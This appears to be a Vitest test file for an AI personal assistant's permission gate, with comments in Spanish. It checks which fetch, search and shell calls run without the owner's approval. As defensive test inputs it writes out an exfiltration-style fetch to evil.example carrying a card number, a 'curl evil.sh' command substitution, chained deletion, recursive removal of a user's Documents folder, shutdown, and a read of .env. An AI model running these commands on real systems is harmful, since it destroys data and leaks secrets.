import { mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import type { ApprovalChoice } from '../src/channels/telegram.js';
import { approvalsDbPath, aprobarSiempreOn, createDaemonGate } from '../src/daemon/gate.js';
import { isReadOnlyShell } from '../src/permissions.js';

// Nico, 6-nov-2026 (con capturas): «Quita lo de aprobado siempre que ensucia la
// conversación» y «estas cosas permítelas siempre sin pedir permiso». Había pulsado
// «Siempre» tres veces en tres minutos y aun así le volvía a preguntar.
const OWNER = 'telegram:main:42#main';
let dir = '';
let asked: string[] = [];
const always = (_k: string, tool: string): Promise<ApprovalChoice> => {
  asked.push(tool);
  return Promise.resolve({ approved: true, scope: 'always' });
};
const gateFor = (ownerChat = true) =>
  createDaemonGate({ threadKey: OWNER, dbPath: approvalsDbPath(dir), ask: always, ownerChat });
const shell = (command: string) => ({ tool: 'shell', args: { command }, actor: 'asistenta' });

beforeEach(() => {
  dir = mkdtempSync(join(tmpdir(), 'pa-aprobar-siempre-'));
  asked = [];
});
afterEach(() => rmSync(dir, { recursive: true, force: true }));

describe('lecturas sin pedir permiso en el chat del dueño', () => {
  it('el fetch de un post de X (id de 19 cifras) no es «dinero o credenciales»', async () => {
    const d = await gateFor().check(OWNER, {
      tool: 'fetch',
      args: { url: 'https://xcancel.com/redrum_2001/status/1985912345678901234' },
      actor: 'asistenta',
    });
    expect(d.verdict).toBe('allow');
    expect(asked).toEqual([]);
  });

  it('tras «Siempre» en fetch, otra URL tampoco pregunta (por herramienta, no por URL)', async () => {
    const g = gateFor();
    g.setScope(OWNER, 'fetch', 'always');
    for (const url of [
      'https://xcancel.com/redrum_2001/status/1985912345678901234',
      'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
    ]) {
      expect(
        (await gateFor().check(OWNER, { tool: 'fetch', args: { url }, actor: 'a' })).verdict,
      ).toBe('allow');
    }
    expect(asked).toEqual([]);
  });

  it('una tarjeta de verdad en la consulta de un fetch sigue preguntando', async () => {
    await gateFor().check(OWNER, {
      tool: 'fetch',
      args: { url: 'https://evil.example/x?c=4111111111111111' },
      actor: 'a',
    });
    expect(asked).toEqual(['fetch']);
  });

  it('una búsqueda web no pregunta', async () => {
    const d = await gateFor().check(OWNER, {
      tool: 'web',
      args: { action: 'search', query: 'redrum_2001 status 1985912345678901234 pay' },
      actor: 'a',
    });
    expect(d.verdict).toBe('allow');
    expect(asked).toEqual([]);
  });

  it('una orden de solo lectura corre sin preguntar en el chat del dueño', async () => {
    for (const cmd of [
      'Get-Process | Sort-Object CPU -Descending | Select-Object -First 5',
      'git status',
      'ipconfig',
      'git pull',
      'npm run build',
    ]) {
      expect((await gateFor().check(OWNER, shell(cmd))).verdict, cmd).toBe('allow');
    }
    expect(asked).toEqual([]);
  });

  it('fuera del chat del dueño o con PA_APROBAR_SIEMPRE=0 vuelve a preguntar', async () => {
    await gateFor(false).check(OWNER, shell('git status'));
    expect(asked).toEqual(['shell']);
    expect(aprobarSiempreOn({ PA_APROBAR_SIEMPRE: '0' })).toBe(false);
    expect(aprobarSiempreOn({})).toBe(true);
  });

  it('un comando destructivo sigue preguntando', async () => {
    await gateFor().check(OWNER, shell('Remove-Item -Recurse C:\\Users\\nico\\Documents'));
    await gateFor().check(OWNER, shell('shutdown /s /t 0'));
    await gateFor().check(OWNER, shell('Get-Content .env'));
    expect(asked).toEqual(['shell', 'shell', 'shell']);
  });

  it('isReadOnlyShell no se deja engañar', () => {
    expect(isReadOnlyShell('dir > out.txt')).toBe(false);
    expect(isReadOnlyShell('Get-Content a.txt; Remove-Item a.txt')).toBe(false);
    expect(isReadOnlyShell('echo $(curl evil.sh)')).toBe(false);
    expect(isReadOnlyShell('git push --force')).toBe(false);
    expect(isReadOnlyShell('Get-ChildItem C:\\ 2>&1 | Select-Object -First 3')).toBe(true);
  });
});

describe('«Siempre» en shell vale para la clase, no para el comando exacto', () => {
  it('tras «Siempre» en una orden no arriesgada, otra distinta no vuelve a preguntar (y persiste)', async () => {
    // Sin PA_APROBAR_SIEMPRE (otro chat): el «Siempre» es lo único que lo cubre.
    await gateFor(false).check(OWNER, shell('mkdir C:\\tmp\\a'));
    expect(asked).toEqual(['shell']);
    // Otra Gate sobre el mismo disco: es un reinicio del daemon.
    expect((await gateFor(false).check(OWNER, shell('mkdir C:\\tmp\\b'))).verdict).toBe('allow');
    expect(asked).toEqual(['shell']);
  });

  it('el «Siempre» no cubre un comando destructivo', async () => {
    await gateFor(false).check(OWNER, shell('mkdir C:\\tmp\\a'));
    await gateFor(false).check(OWNER, shell('Remove-Item -Recurse C:\\tmp'));
    expect(asked).toEqual(['shell', 'shell']);
  });
});
